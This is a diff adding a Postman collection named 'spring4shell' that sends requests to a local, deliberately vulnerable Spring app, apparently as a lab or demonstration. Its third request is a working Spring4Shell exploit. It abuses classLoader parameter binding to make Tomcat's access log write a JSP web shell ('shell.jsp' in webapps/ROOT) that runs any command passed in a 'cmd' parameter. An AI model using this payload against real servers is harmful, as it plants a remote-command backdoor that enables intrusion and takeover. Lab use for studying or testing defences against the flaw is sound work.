@@ -1,0 +1,133 @@
+{
+	"info": {
+		"_postman_id": "28a91988-ac7e-4d4c-a856-9026cc447638",
+		"name": "spring4shell",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "3684120"
+	},
+	"item": [
+		{
+			"name": "get /",
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": []
+				},
+				"url": {
+					"raw": "http://localhost:8080/spring4shell-vulnerable-app/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"spring4shell-vulnerable-app",
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "post /example 1",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "attribute1",
+							"value": "aaa",
+							"type": "text"
+						},
+						{
+							"key": "attribute2.subAttribute1",
+							"value": "bbb",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/spring4shell-vulnerable-app/example",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"spring4shell-vulnerable-app",
+						"example"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "post /example 2",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "jsp-open",
+						"value": "<%",
+						"type": "text"
+					},
+					{
+						"key": "jsp-close",
+						"value": "%>",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.directory",
+							"value": "webapps/ROOT",
+							"type": "text"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.prefix",
+							"value": "shell",
+							"type": "text"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.suffix",
+							"value": ".jsp",
+							"type": "text"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
+							"value": "%{jsp-open}i out.println(new String(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream().readAllBytes())); %{jsp-close}i",
+							"type": "text"
+						},
+						{
+							"key": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat",
+							"value": "",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/spring4shell-vulnerable-app/example",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"spring4shell-vulnerable-app",
+						"example"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
